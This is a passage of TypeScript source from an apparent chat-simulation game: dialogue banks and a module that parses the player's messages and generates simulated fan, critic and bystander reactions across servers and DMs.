  hater: ["why do you even come to these servers", "you could just... not post"],
  indifferent: ["hi, someone told me to message you", "hey"],
};
export const DM_REPLY: Record<Obsession, string[]> = {
  obsessed: ["OMG HI", "you actually replied 😭😭", "i'm shaking. hi. thank you", "can i screenshot this", "this is the best day of my life"],
  supporter: ["oh hey! thanks for replying", "haha that's so cool you answered", "appreciate you"],
  business: ["Thanks for getting back to me.", "Great. I'll send details.", "Appreciate the reply."],
  skeptic: ["ok so it IS you", "huh. fair enough", "interesting"],
  rival: ["oh. ok. hi", "didn't think you'd answer tbh", "cool i guess"],
  hater: ["...still not a fan", "ok that was kinda decent of you", "whatever"],
  indifferent: ["oh hi", "ok cool", "nice"],
};

/** everyday god talk when he's NOT around (obsession behaviours) */
export const AMBIENT: Record<Obsession, string[]> = {
  obsessed: ["@god when are you coming back to #general", "has anyone seen god online today", "my fan account just hit {n}k btw", "never forget when he said \"{past}\"",
    "i check this server every 5 min in case he shows up", "if god ever replies to me i'm changing my name to 'noticed'", "@god good morning (he won't see this but still)",
    "rewatching the \"{past}\" screenshot for the {n}th time", "who else has notifications on for god", "day {n} of waiting for god to say hi again",
    "leave him alone he's doing his thing", "i'd defend god in court for free"],
  supporter: ["god's been quiet. too quiet", "what do we think god is up to today", "i miss when god posted more", "his last message was \"{past}\" right?",
    "lowkey wonder what god's day looks like", "god would love this channel today", "remember \"{past}\"? classic"],
  business: ["his net worth is {nw} and y'all still argue", "{holding} is underrated as a move", "i think he's about to buy something big. pattern's there",
    "god effect index is up again", "studying god's moves like it's homework", "what's everyone's read on {holding}"],
  skeptic: ["still waiting for proof on half of these god stories", "\"{past}\" is the most PR thing anyone has ever typed", "is {nw} even real",
    "y'all treat screenshots like court evidence", "notice how he only shows up when there's news"],
  rival: ["why does everyone care so much about god", "i've done more for this server than god", "i could be god if i had his luck",
    "fan accounts for a guy who says \"{past}\" 😭", "attention economy and he's the landlord"],
  hater: ["god fans are actually the worst", "\"{past}\" is the cringiest message in server history", "his net worth won't buy taste", "we need a god-free channel",
    "every day this server is 80% glazing", "can a mod ban the word god"],
  indifferent: ["is god that rich guy?", "anyway {personal}", "this server is weird about that guy", "i'm just here for {world}"],
};

```

## src/lib/sim/godspeak.ts
```ts
import { rngFor, type Rng } from "./rng";
import type { BusEvent, Channel, Character, Message, Obsession, Post, Server, Topic, WorldState } from "./types";
import { charById, netWorth } from "./world";
import { clamp, diurnal, engagementFor, makeArticle, makePost, memeFor, nid, notify, rememberText, runEpisode, seenText } from "./engine";
import { MEME_LINES } from "./memes";
import { expand, type Slots } from "./grammar";
import { styleText, typo } from "./style";
import { obsessionOf } from "./social";
import { getGenerator, slotsFor } from "./generator";
import { fmtMoney } from "./format";
import { crewDmReply, crewRole } from "./undernet";
import { COMMAND_BANK, PRESENCE_LINES, findMentioned, godStopTyping, parseCommand } from "./presence";
import { tagify, COINS } from "./topics";
import { AMBIENT, BY_OBSESSION, CHAIN, DM_OPEN, DM_REPLY, ECHO_OPEN, ECHO_REPLY, FREAK, FREAK_OTHERS, HYPE, LEAD, TO_GOD, type GodIntent } from "./godlines";

const SEC = 1000, MIN = 60_000;

// ---------------------------------------------------------------- intent parsing
const STOP = new Set("the a an and or but if then so to of in on at for with from by is are was were be been am i you we they he she it my your our their me us them this that these those just really very what who why how when where do does did can could should would will im i'm its it's dont don't guys yall y'all hey hi yo sup lol lmao ok okay today now here there about all any some get got".split(" "));

export interface ParsedGod { intent: GodIntent; keywords: string[]; question: boolean; mentions: string[]; coin?: string; quote: string }

export function parseGodText(text: string): ParsedGod {
  const t = text.toLowerCase().trim();
  const coin = text.match(/\$([A-Za-z]{2,8})\b/)?.[1]?.toUpperCase() ?? COINS.find((c) => t.includes(c.toLowerCase()));
  const question = /\?\s*$/.test(t) || /^(who|what|why|how|when|where|should|do|does|is|are|can|would|anyone|which|wanna)\b/.test(t);
  const mentions = [...text.matchAll(/@([\w.]+)/g)].map((m) => m[1].toLowerCase()).filter((m) => m !== "god");
  const has = (re: RegExp) => re.test(t);
  let intent: GodIntent;
  if (has(/\b(gn|good ?night|bye|cya|later guys|gotta go|brb|logging off|peace out)\b/)) intent = "farewell";
  else if (coin || has(/\b(crypto|coins?|tokens?|btc|eth|pump|moon(ing)?|wallet|chart|hodl|memecoin)\b/)) intent = "crypto";
  else if (has(/\b(bought|buying|buy|purchased|acquired|picked up|just got|ordered|shopping)\b/)) intent = "purchase";
  else if (has(/\b(announc\w*|launch\w*|big news|dropping|coming soon|stay tuned|reveal|tomorrow)\b/) || t.startsWith("!")) intent = "announcement";
  else if (has(/\b(love (you|y'?all|this|u)|proud of|thank(s| you)|appreciate|best (community|server)|you guys rock|ily)\b/)) intent = "compliment";
  else if (has(/\b(mid|cringe|clowns?|losers?|haters?|broke|cope|seethe|shut up)\b/)) intent = "insult";
  else if (has(/\b(tired|sad|rough|lonely|bad day|stress\w*|exhausted|bored)\b/)) intent = "sad";
  else if (question) intent = "question";
  else if (has(/^(yo+|sup|hey+|hi+|hello|gm|good morning|wass?up|whats? up|what's good|evening|howdy|hola)\b/) || has(/\b(sup guys|hey guys|hi guys|hello everyone)\b/)) intent = "greeting";
  else if (has(/\b(billion|million|yacht|jet|island|lambo|penthouse|rich|net worth|private|mansion|ferrari)\b/)) intent = "flex";
  else if (has(/\b(lol|lmao|haha|joke|jk|💀|😂)/)) intent = "joke";
  else if (has(/!{2,}|\b(let'?s go+|lfg|huge|insane|we('re| are) so back)\b/)) intent = "hype";
  else intent = "generic";
  const keywords = t.replace(/[^a-z0-9$#@ ]/g, " ").split(/\s+/).filter((w) => w.length > 2 && !STOP.has(w) && !w.startsWith("@")).slice(0, 4);
  const quote = text.trim().length > 56 ? text.trim().slice(0, 53).replace(/\s+\S*$/, "") + "…" : text.trim();
  return { intent, keywords, question, mentions, coin, quote };
}

// ---------------------------------------------------------------- helpers
const REACT_EMOJI: Record<Obsession, string[]> = {
  obsessed: ["👑", "😭", "🔥", "🙏", "🐐", "💯", "🫡", "❤️"], supporter: ["👑", "🔥", "😭", "👋", "🙌", "❤️"], business: ["📈", "👀", "🧠", "🤝", "💰"],
  skeptic: ["🤨", "👀", "🧐"], rival: ["🙄", "👀", "😐"], hater: ["🤡", "🥱", "💀", "🙄"], indifferent: ["👋", "👀"],
};
const INTENT_EMOJI: Partial<Record<GodIntent, string[]>> = { greeting: ["👋", "👋", "🫡"], joke: ["😂", "💀"], crypto: ["🚀", "📈"], purchase: ["💸", "🤑"], sad: ["🫂", "❤️"], compliment: ["🥹", "❤️"], announcement: ["👀", "🚨"], farewell: ["👋", "😭"], flex: ["💸", "🤯"] };

const isCaps = (s: string) => /[A-Z]/.test(s) && !/[a-z]/.test(s.replace(/@[\w.]+|\{[a-z]+\}/gi, ""));
const fanish = (o: Obsession) => o === "obsessed" || o === "supporter";
const negish = (o: Obsession) => o === "hater" || o === "rival";

function srvChan(s: WorldState, serverId: string, channelId: string) {
  const srv = s.servers.find((x) => x.id === serverId);
  return { srv, ch: srv?.channels.find((c) => c.id === channelId) };
}

export function pastGodLine(s: WorldState, rng: Rng, excludeId?: string) {
  const prior = s.godLog.filter((g) => g.id !== excludeId && g.serverId !== "dm"); // never quote DMs in public
  if (prior.length) {
    const g = rng.pick(prior.slice(-12));
    const { srv, ch } = srvChan(s, g.serverId, g.channelId);
    return { text: g.text.length > 44 ? g.text.slice(0, 41) + "…" : g.text, where: srv && ch ? `${srv.name} #${ch.name}` : "DMs" };
  }
  const h = s.player.history.filter((x) => x.text.startsWith("📝")).slice(-6);
  if (h.length) return { text: rng.pick(h).text.replace(/^📝 Posted on \w+: "/, "").replace(/"$/, "").slice(0, 44), where: "Chirp" };
  return { text: "life is easier on creative mode", where: "Chirp" };
}

interface Ctx { s: WorldState; rng: Rng; srv: Server; ch: Channel; god: Message; p: ParsedGod; now: number; topic: Topic }

function slots(x: Ctx, c: Character, user?: Character, extra: Slots = {}): Slots {
  const { s, rng, p, srv, ch } = x;
  const past = pastGodLine(s, rng, x.god.id);
  const mem = c.memory.length ? rng.pick(c.memory).label : undefined;
  const hold = s.player.holdings.length ? rng.pick(s.player.holdings).name : "the empire";
  return slotsFor(rng, s, c, undefined, {
    q: p.quote, Q: p.quote.toUpperCase(), kw: p.keywords.length ? rng.pick(p.keywords) : p.quote.split(" ")[0] || "that",
    coin: p.coin ?? (s.player.holdings.find((h) => h.kind === "coin")?.name.replace(/^\$/, "") ?? rng.pick(COINS)), ch: ch.name, server: srv.name, user: user?.username ?? "someone",
    past: past.text, pastwhere: past.where, mem: mem ?? `the ${hold} thing`, holding: hold, nw: fmtMoney(netWorth(s)), here: srv.name, ...extra,
  });
}

/** fill + voice + dedupe (global window + this character's own recent lines). */
export function line(s: WorldState, rng: Rng, c: Character, banks: string[], sl: Slots, opts: { lead?: string[]; keepCaps?: boolean } = {}): string {
  let best = "";
  for (let k = 0; k < 7; k++) {
    let raw = expand(rng.pick(banks), sl, rng);
    if (opts.lead && rng.chance(0.4)) {
      const l = expand(rng.pick(opts.lead), sl, rng);
      raw = isCaps(l) && !isCaps(raw) && rng.chance(0.5) ? `${l} ${raw.toUpperCase()}` : `${l} ${raw}`;
    }
    const caps = isCaps(raw);
    let text = caps ? raw : styleText(rng, c, raw, { short: true, allowTypo: false }).text;
    if (caps && rng.chance(0.35)) text += " " + rng.pick(c.emojis);
    if (caps && rng.chance(0.25)) text = text.replace(/([A-Z])$/, (m) => m + m.repeat(rng.int(1, 4)));
    best = text;
    if (!seenText(s, text)) break;
  }
  const gen = getGenerator();
  if (gen.react) best = gen.react({ rng, state: s, speaker: c, draft: best, godText: String((sl as Record<string, unknown>).q ?? "") }) || best;
  rememberText(s, best);
  return best;
}

function audience(x: Ctx, weightFor: (o: Obsession, c: Character) => number, exclude: Set<string>, t: number): Character | undefined {
  const pool = x.srv.members.filter((id) => !exclude.has(id));
  if (!pool.length) return undefined;
  const id = x.rng.weighted(pool, (id) => {
    const c = charById(x.s, id);
    return weightFor(obsessionOf(c), c) * (0.25 + diurnal(c, t)) * Math.sqrt(c.activity) * (c.core ? 3 : 1) * (1 + (c.bond ?? 0) / 40);
  });
  return charById(x.s, id);
}

class Burst {
  msgs: Message[] = [];
  cur: number;
  constructor(public x: Ctx, start: number) { this.cur = start; }
  push(c: Character, text: string, o: { replyTo?: string; intent: string; gap?: [number, number]; typingStart?: number; threadOf?: string } ) {
    const { s, rng, srv, ch } = this.x;
    if (o.gap) this.cur += rng.range(o.gap[0], o.gap[1]);
    const typeDur = clamp(text.length * rng.range(38, 75), 900, 7000);
    const t = Math.round(this.cur);
    const m: Message = {
      id: nid(s, "m"), episodeId: this.x.god.id, serverId: srv.id, channelId: ch.id, authorId: c.id, text, t, topicId: this.x.topic.id, replyTo: o.replyTo,
      reactions: [], kind: "chat", intent: o.intent, score: 1 + (c.core ? 1 : 0), typingFrom: Math.round(o.typingStart ?? Math.max(this.x.now + 400, t - typeDur)),
      mentionsGod: /@god\b/i.test(text) || o.replyTo === this.x.god.id || undefined, threadOf: o.threadOf,
    };
    // characters occasionally fix a typo by editing instead of sending "*word"
    if (!isCaps(text) && rng.chance(0.07)) {
      const ty = typo(rng, text);
      if (ty.word) { m.editText = text; m.text = ty.text; m.editedAt = t + Math.round(rng.range(3, 14) * SEC); }
    }
    this.msgs.push(m);
    s.stats.messages++;
    c.postCount++;
    return m;
  }
}

/** @god talks in a Lounge channel or DM. Builds the whole reaction up front, timed from `now`. */
export function godSpeak(s: WorldState, serverId: string, channelId: string, text: string, now: number, replyTo?: string): { message: Message; replies: number; reactions: number; servers: string[] } {
  const p = parseGodText(text);
  const god: Message = { id: nid(s, "m"), serverId, channelId, authorId: "god", text, t: now, reactions: [], reactionLog: [], kind: "chat", score: 50, replyTo, intent: `god:${p.intent}` };
  s.pending.push(god);
  s.stats.messages++;
  s.godLog.push({ id: god.id, t: now, text, serverId, channelId, intent: p.intent });
  if (s.godLog.length > 60) s.godLog.splice(0, s.godLog.length - 60);
  godStopTyping(s, channelId, now);
  if (serverId === "dm") return { message: god, replies: dmReply(s, god, p, now), reactions: 0, servers: [] };

  const { srv, ch } = srvChan(s, serverId, channelId);
  if (!srv || !ch) return { message: god, replies: 0, reactions: 0, servers: [] };
  const rng = rngFor(s.seed, "speak", god.id);
  const topic: Topic = { id: nid(s, "t"), tag: tagify(`God In ${srv.name}`), label: `god chatting in ${srv.name}`, about: "god", category: "chat", valence: 0.15, magnitude: 2.5, heat: 6, startedAt: now, subject: p.quote, facts: {} };
  s.topics.push(topic);
  god.topicId = topic.id;
  const x: Ctx = { s, rng, srv, ch, god, p, now, topic };
  const act = clamp(s.settings.activity, 0.4, 3);

  const target = replyTo ? [...s.messages, ...s.pending].find((m) => m.id === replyTo) : undefined;
  // direct address: a reply, or an @mention of someone (in this server first, then anywhere)
  const targetChar = target && target.authorId.startsWith("c") ? charById(s, target.authorId) : findMentioned(s, p.mentions, srv);
  const cmd = targetChar ? parseCommand(text) : undefined;
  const b = new Burst(x, now + rng.range(1.6, 2.6) * SEC);
  const spoke = new Map<string, number>();
  const say = (c: Character, txt: string, o: Parameters<Burst["push"]>[2]) => { spoke.set(c.id, (spoke.get(c.id) ?? 0) + 1); return b.push(c, txt, o); };

  // --- @god replied to a specific character: they freak out first, others react to *that*
  if (targetChar) {
    const ob = obsessionOf(targetChar);
    const P = PRESENCE_LINES;
    const roastee = cmd?.kind === "roast" ? findMentioned(s, [cmd.target ?? ""], srv) : undefined;
    const firstBank = cmd ? COMMAND_BANK[cmd.kind] : !target ? (negish(ob) ? P.addressedNeg : P.addressed) : FREAK[ob];
    const first = say(targetChar, line(s, rng, targetChar, firstBank, slots(x, targetChar, roastee, { target: roastee ? `@${roastee.username}` : cmd?.target ?? "you" }), { keepCaps: true }), { replyTo: god.id, intent: cmd ? `cmd:${cmd.kind}` : "addressed", typingStart: now + rng.range(0.15, 0.3) * SEC, gap: [-1.2 * SEC, -0.8 * SEC] });
    if (cmd?.kind === "meme") first.meme = memeFor(s, rng, targetChar, topic, text);
    if (cmd) {
      (s.godMoments ??= []).push({ t: now, kind: "command", text: `You asked @${targetChar.username} to ${cmd.kind === "hi" ? "say hi" : cmd.kind === "roast" ? `roast ${cmd.target}` : cmd.kind === "defend" ? "defend you" : cmd.kind === "meme" ? "drop a meme" : cmd.kind === "joke" ? "tell a joke" : "do something"}. They did`, link: `lounge:${srv.id}:${ch.id}` });
      if (roastee && roastee.id !== targetChar.id) say(roastee, line(s, rng, roastee, P.cmdRoastBack, slots(x, roastee, targetChar)), { replyTo: first.id, intent: "roasted", gap: [1.5 * SEC, 3 * SEC] });
    } else if (fanish(ob) && rng.chance(0.6)) say(targetChar, line(s, rng, targetChar, FREAK[ob], slots(x, targetChar)), { intent: "freak", gap: [1.2 * SEC, 3 * SEC] });
    // others comment on the exchange
    for (let i = 0, n = rng.int(1, 2); i < n; i++) {
      const w = audience(x, (o2) => (fanish(o2) ? 3 : 1), new Set([targetChar.id]), b.cur);
      if (w) say(w, line(s, rng, w, P.watchers, slots(x, w, targetChar)), { intent: "watch", gap: [0.6 * SEC, 1.8 * SEC] });
    }
    const nOthers = Math.round(rng.range(3, 6) * Math.sqrt(act));
    for (let i = 0; i < nOthers; i++) {
      const o = audience(x, (ob2) => (fanish(ob2) ? 3 : negish(ob2) ? 1.5 : 1), new Set([targetChar.id]), b.cur);
      if (!o) break;
      say(o, line(s, rng, o, FREAK_OTHERS, slots(x, o, targetChar)), { replyTo: rng.chance(0.4) ? first.id : undefined, intent: "noticed", gap: [0.8 * SEC, 3.5 * SEC], typingStart: i < 3 ? now + rng.range(0.8, 2.2) * SEC : undefined });
    }
    targetChar.bond = clamp((targetChar.bond ?? 0) + 15, 0, 100);
    targetChar.opinion = clamp(targetChar.opinion + (negish(ob) ? 8 : 5), -100, 100);
    (targetChar.godContacts ??= []).push({ t: now, kind: "replied", text: p.quote, where: `${srv.name} #${ch.name}` });
    if (targetChar.godContacts.length > 10) targetChar.godContacts.shift();
  }

  // --- wave 1: several people start typing within 1-3s, hype lands in a burst
  const wave1 = targetChar ? rng.int(2, 3) : rng.int(3, 5);
  const firstWave: Message[] = [];
  for (let i = 0; i < wave1; i++) {
    const c = audience(x, (o) => ({ obsessed: 6, supporter: 3, business: 1, skeptic: 0.6, rival: 0.7, hater: 0.8, indifferent: 0.2 })[o], new Set(spoke.keys()), b.cur);
    if (!c) break;
    const ob = obsessionOf(c);
    const r = rng.next();
    const bank = fanish(ob) ? (r < 0.35 ? LEAD[ob] : r < 0.65 ? TO_GOD[p.intent] : HYPE) : r < 0.6 ? BY_OBSESSION[ob] : LEAD[ob];
    if (i === 1 && firstWave[0] && firstWave[0].authorId.startsWith("c")) {
      // the second voice answers the first: character-to-character from the very first seconds
      const B = charById(s, firstWave[0].authorId), obB = obsessionOf(B);
      const chainBank = fanish(ob) && negish(obB) ? CHAIN.fanToHater : negish(ob) && fanish(obB) ? CHAIN.haterToFan : fanish(ob) && fanish(obB) ? CHAIN.fanToFan : CHAIN.noticed;
      firstWave.push(say(c, line(s, rng, c, chainBank, slots(x, c, B)), { replyTo: firstWave[0].id, intent: "chain", gap: [0.4 * SEC, 1.1 * SEC], typingStart: now + rng.range(0.5, 1.6) * SEC }));
      continue;
    }
    const txt = line(s, rng, c, bank, slots(x, c), { lead: bank === LEAD[ob] ? undefined : LEAD[ob] });
    firstWave.push(say(c, txt, { replyTo: i === 0 || rng.chance(0.4) ? god.id : undefined, intent: "hype", gap: i ? [0.5 * SEC, 1.6 * SEC] : undefined, typingStart: now + rng.range(0.5, 2.2) * SEC }));
  }

  // --- main burst: contextual replies, chains between characters, memories, drift
  const total = Math.round(clamp((9 + srv.bias * 8 + rng.poisson(3)) * act, 6, 30));
  let conflicts = 0, modded = false, drifted = 0;
  for (let i = 0; i < total; i++) {
    const r = rng.next();
    const prev = b.msgs.length ? b.msgs[b.msgs.length - 1] : god;
    const gap: [number, number] = i < 6 ? [0.9 * SEC, 3.2 * SEC] : [1.8 * SEC, 7 * SEC];
    if (conflicts >= 2 && !modded && srv.moderators.length) {
      modded = true;
      const mod = charById(s, rng.pick(srv.moderators));
      const m = b.push(mod, line(s, rng, mod, CHAIN.mod, slots(x, mod)), { intent: "mod", gap });
      m.kind = "system";
      continue;
    }
    if (r < 0.24) {
      // direct, contextual reply to what god said
      const c = audience(x, (o) => ({ obsessed: 4, supporter: 3, business: 2, skeptic: 1, rival: 0.6, hater: 0.6, indifferent: 0.3 })[o], new Set(), b.cur);
      if (!c) continue;
      say(c, line(s, rng, c, TO_GOD[p.intent], slots(x, c)), { replyTo: rng.chance(0.5) ? god.id : undefined, intent: "toGod", gap });
    } else if (r < 0.42) {
      const c = audience(x, (o) => ({ obsessed: 2, supporter: 1.5, business: 1.5, skeptic: 1.6, rival: 1.6, hater: 1.8, indifferent: 0.5 })[o], new Set(), b.cur);
      if (!c) continue;
      const ob = obsessionOf(c);
      say(c, line(s, rng, c, BY_OBSESSION[ob], slots(x, c)), { replyTo: ob === "business" && rng.chance(0.4) ? god.id : undefined, intent: `stance:${ob}`, gap });
    } else if (r < 0.7 && b.msgs.length) {
      // character → character
      const pick = rng.chance(0.6) ? prev : rng.pick(b.msgs);
      if (pick.authorId === "god" || !pick.authorId.startsWith("c")) continue;
      const B = charById(s, pick.authorId), ob = obsessionOf(B);
      const A = audience(x, (o) => (fanish(ob) ? (negish(o) || o === "skeptic" ? 3 : fanish(o) ? 2 : 0.5) : negish(ob) ? (fanish(o) ? 4 : 0.5) : 1), new Set([B.id]), b.cur);
      if (!A) continue;
      const oa = obsessionOf(A);
      let bank: string[];
      if (fanish(oa) && negish(ob)) { bank = CHAIN.fanToHater; conflicts++; }
      else if (negish(oa) && fanish(ob)) { bank = CHAIN.haterToFan; conflicts++; }
      else if (oa === "skeptic" && fanish(ob)) bank = CHAIN.skepticToFan;
      else if (fanish(oa) && fanish(ob)) bank = rng.chance(0.7) ? CHAIN.fanToFan : CHAIN.noticed;
      else bank = CHAIN.noticed;
      say(A, line(s, rng, A, bank, slots(x, A, B)), { replyTo: rng.chance(0.75) ? pick.id : undefined, intent: "chain", gap });
      if (rng.chance(0.25)) (pick.reactionLog ??= []).push([rng.pick(negish(oa) ? ["💀", "🤡"] : ["😭", "💯", "🔥"]), Math.round(b.cur + rng.range(1, 6) * SEC), A.id]);
    } else if (r < 0.78) {
      const c = audience(x, (o) => (fanish(o) ? 2 : o === "business" ? 1.5 : 0.6), new Set(), b.cur);
      if (!c) continue;
      say(c, line(s, rng, c, CHAIN.memory, slots(x, c)), { intent: "memory", gap });
    } else if (r < 0.85) {
      const c = audience(x, (o) => (fanish(o) || o === "business" ? 2 : 0.5), new Set(), b.cur);
      if (!c) continue;
      say(c, line(s, rng, c, CHAIN.upTo, slots(x, c)), { replyTo: rng.chance(0.3) ? god.id : undefined, intent: "upTo", gap });
    } else if (r < 0.92) {
      const late = audience(x, () => 1, new Set(spoke.keys()), b.cur);
      if (!late) continue;
      const q = say(late, line(s, rng, late, CHAIN.catchUp, slots(x, late)), { intent: "catchUp", gap });
      const ans = audience(x, (o) => (fanish(o) ? 2 : 1), new Set([late.id]), b.cur);
      if (ans) say(ans, line(s, rng, ans, CHAIN.catchUpAnswer, slots(x, ans, late)), { replyTo: q.id, intent: "answer", gap: [1.5 * SEC, 5 * SEC] });
    } else if (i > total / 2 && drifted < 2) {
      drifted++;
      const c = audience(x, (o) => (o === "indifferent" ? 4 : negish(o) ? 1.5 : 0.6), new Set(), b.cur);
      if (!c) continue;
      say(c, line(s, rng, c, CHAIN.drift, slots(x, c)), { intent: "drift", gap });
    } else {
      // self follow-up burst
      const last = b.msgs[b.msgs.length - 1];
      if (!last || !last.authorId.startsWith("c")) continue;
      const c = charById(s, last.authorId);
      say(c, line(s, rng, c, fanish(obsessionOf(c)) ? HYPE : BY_OBSESSION[obsessionOf(c)], slots(x, c)), { intent: "followup", gap: [0.7 * SEC, 2.2 * SEC] });
    }
  }
  // --- tail: "is he still here?"
  for (let i = 0, n = rng.int(1, 3); i < n; i++) {
    const c = audience(x, (o) => (fanish(o) ? 2 : 1), new Set(), b.cur);
    if (c) say(c, line(s, rng, c, rng.chance(0.65) ? CHAIN.still : CHAIN.drift, slots(x, c)), { intent: "still", gap: [25 * SEC, 110 * SEC] });
  }

  // --- a thread under god's message for the decoders
  if (["announcement", "question", "crypto", "purchase", "flex", "generic"].includes(p.intent) && rng.chance(0.55)) {
    let tt = now + rng.range(12, 40) * SEC;
    const THREAD = ["thread for decoding \"{q}\"", "my theory: it's about {kw}", "he used the word \"{kw}\". that's not random", "you're all overthinking it", "saving this for the history books",
      "ok but the timing right after {world}?", "@god if you're reading the thread, blink twice", "i give it 48h before something drops", "his last message was \"{past}\". connect the dots", "or he was just bored"];
    for (let i = 0, n = rng.int(3, 7); i < n; i++) {
      const c = audience(x, (o) => (o === "business" || o === "skeptic" ? 2.5 : fanish(o) ? 1.6 : 0.7), new Set(), tt);
      if (!c) break;
      const m = b.push(c, line(s, rng, c, THREAD, slots(x, c)), { intent: "thread", threadOf: god.id });
      m.t = Math.round(tt); m.typingFrom = Math.round(tt - 3000); tt += rng.range(8, 50) * SEC;
    }
  }

  // --- reactions pile onto god's message over the next minutes (each one by a real member)
  const nReact = Math.round(clamp((6 + srv.bias * 14 + b.msgs.length * 0.9) * act * rng.range(0.8, 1.3), 5, 70));
  const reactors = rng.shuffle(srv.members.slice()).slice(0, nReact);
  for (const id of reactors) {
    const c = charById(s, id), ob = obsessionOf(c);
    const pool = INTENT_EMOJI[p.intent] && rng.chance(0.35) ? INTENT_EMOJI[p.intent]! : REACT_EMOJI[ob];
    god.reactionLog!.push([rng.pick(pool), Math.round(now + 1200 + Math.min(240, -Math.log(1 - rng.next()) * 22) * SEC), id]);
  }
  god.reactionLog!.sort((a, c) => a[1] - c[1]);
  for (const m of firstWave) if (rng.chance(0.5)) (m.reactionLog ??= []).push([rng.pick(["😭", "💀", "🔥", "💯"]), Math.round(m.t + rng.range(2, 15) * SEC), rng.pick(srv.members)]);

  // --- mods pin it in fan servers
  if (srv.bias >= 0.3 && srv.moderators.length && !targetChar && rng.chance(0.7)) {
    const mod = charById(s, rng.pick(srv.moderators));
    god.pinnedAt = Math.round(now + rng.range(25, 90) * SEC);
    b.msgs.push({ id: nid(s, "m"), serverId: srv.id, channelId: ch.id, authorId: mod.id, text: "pinned a message to this channel.", t: god.pinnedAt, reactions: [], kind: "system", intent: "pin", score: 0.1, replyTo: god.id });
  }
  // --- someone already made a meme out of it
  const mr = rngFor(s.seed, "godmeme", god.id);
  if (mr.chance(0.75)) {
    const mc = audience(x, (o) => (fanish(o) ? 2 : negish(o) ? 1.2 : 0.4) * 1, new Set(), now);
    if (mc) {
      const t = Math.round(now + mr.range(9, 24) * SEC);
      b.msgs.push({ id: nid(s, "m"), episodeId: god.id, serverId: srv.id, channelId: ch.id, authorId: mc.id, text: mr.pick(["already made the meme", ...MEME_LINES]), t, typingFrom: t - 2500, topicId: topic.id,
        reactions: [], reactionLog: [[mr.pick(["😭", "💀", "🔥"]), t + 3000, mr.pick(srv.members)], ["😂", t + 6000, mr.pick(srv.members)]], kind: "chat", intent: "meme", score: 3, meme: memeFor(s, mr, mc, topic, text) });
    }
  }
  s.pending.push(...b.msgs);

  // --- notifications (timed, so the badge ticks up live)
  const toGod = b.msgs.filter((m) => m.mentionsGod && !m.threadOf).sort((a, c) => a.t - c.t);
  for (const m of toGod.slice(0, 3)) notify(s, m.t, "mention", `@${charById(s, m.authorId).username} ${m.replyTo === god.id ? "replied to you" : "mentioned you"} in ${srv.name} #${ch.name}: "${(m.editText ?? m.text).slice(0, 70)}"`, `lounge:${srv.id}:${ch.id}`);
  if (toGod.length > 3) notify(s, toGod[toGod.length - 1].t, "mention", `${toGod.length} people replied to or mentioned you in ${srv.name} #${ch.name}`, `lounge:${srv.id}:${ch.id}`);
  const last60 = god.reactionLog!.filter((r) => r[1] <= now + 60 * SEC).length;
  if (last60 >= 5) notify(s, now + 60 * SEC, "mention", `Your message in #${ch.name} got ${last60} reactions in the first minute`, `lounge:${srv.id}:${ch.id}`);

  // --- relationships evolve
  const delta = ({ compliment: 2.5, greeting: 1.2, joke: 1, hype: 1, insult: -3, flex: 0.4, sad: 1.5 } as Partial<Record<GodIntent, number>>)[p.intent] ?? 0.6;
  for (const [id, n] of spoke) {
    const c = charById(s, id);
    c.bond = clamp((c.bond ?? 0) + 1 + n * 0.5, 0, 100);
    c.opinion = clamp(c.opinion + delta * (negish(obsessionOf(c)) ? 0.4 : 1), -100, 100);
    if (c.core) {
      (c.godContacts ??= []).push({ t: now, kind: "saw", text: p.quote, where: `${srv.name} #${ch.name}` });
      if (c.godContacts.length > 10) c.godContacts.shift();
    }
    c.memory.unshift({ topicId: topic.id, label: `god saying "${p.quote}" in #${ch.name}`, feeling: fanish(obsessionOf(c)) ? 0.8 : -0.2, t: now });
    if (c.memory.length > 6) c.memory.pop();
  }

  // --- shared event bus: the rest of the internet hears about it
  const others = s.servers.filter((o) => o.id !== srv.id);
  const nEcho = Math.round(clamp(2 + srv.bias * 2 + (act - 1), 1, 5));
  const echoSrv = rng.shuffle(others.slice()).sort((a, c) => (c.tags.includes("god") ? 1 : 0) + c.bias - ((a.tags.includes("god") ? 1 : 0) + a.bias)).slice(0, nEcho + 2);
  const chosen = rng.shuffle(echoSrv).slice(0, nEcho);
  chosen.forEach((o, i) => schedule(s, { kind: "echo", t: Math.round(now + (35 + i * rng.range(20, 90)) * SEC), topicId: topic.id, data: { server: o.id, from: srv.id, ch: ch.id, q: p.quote, god: god.id } }));
  if (rng.chance(0.85)) schedule(s, { kind: "screenshot", t: Math.round(now + rng.range(50, 160) * SEC), topicId: topic.id, data: { from: srv.id, ch: ch.id, q: p.quote, replies: toGod.length } });
  const dmFrom = [...spoke.keys()].map((id) => charById(s, id)).filter((c) => c.core || fanish(obsessionOf(c)) || obsessionOf(c) === "business");
  if (dmFrom.length && rng.chance(0.6)) schedule(s, { kind: "godDm", t: Math.round(now + rng.range(1.5, 7) * MIN), data: { who: rng.pick(dmFrom).id, from: srv.id, ch: ch.id } });
  return { message: god, replies: b.msgs.length, reactions: god.reactionLog!.length, servers: chosen.map((o) => o.name) };
}

function schedule(s: WorldState, ev: Omit<BusEvent, "id">) {
  s.bus.push({ id: nid(s, "v"), ...ev });
}

// ---------------------------------------------------------------- DMs
export const dmChannel = (a: string, b: string) => `dm:${[a, b].sort().join(":")}`;
export const dmPeer = (channelId: string, me = "god") => channelId.split(":").slice(1).find((x) => x !== me) ?? me;
const DM_SERVER = (members: string[], channelId: string): { srv: Server; ch: Channel } => {
  const ch: Channel = { id: channelId, name: "dm", topic: "", tags: ["life", "god"] };
  return { srv: { id: "dm", name: "Direct Messages", icon: "✉️", color: "#888", description: "", bias: 0, vibe: "culture", tags: ["life"], memberCount: 2, channels: [ch], members, moderators: [], insideJokes: [] }, ch };
};

function dmMsg(s: WorldState, channelId: string, authorId: string, text: string, t: number, typingFrom?: number): Message {
  return { id: nid(s, "m"), serverId: "dm", channelId, authorId, text, t: Math.round(t), reactions: [], kind: "chat", score: 2, typingFrom: typingFrom ? Math.round(typingFrom) : Math.round(t - clamp(text.length * 60, 1000, 6000)), mentionsGod: authorId !== "god" && channelId.includes("god") || undefined };
}

const CROWD = /\b(he|him|his|he's|hes|everyone|everybody|chat|guys|y'all|yall|we have to|clip it|this man|server)\b/i;
function dmReply(s: WorldState, god: Message, p: ParsedGod, now: number) {
  const peer = dmPeer(god.channelId);
  if (!peer.startsWith("c")) return 0;
  const c = charById(s, peer), ob = obsessionOf(c);
  if (crewRole(s, c.id)) {
    const crew = crewDmReply(s, c, god.text, now, god.id);
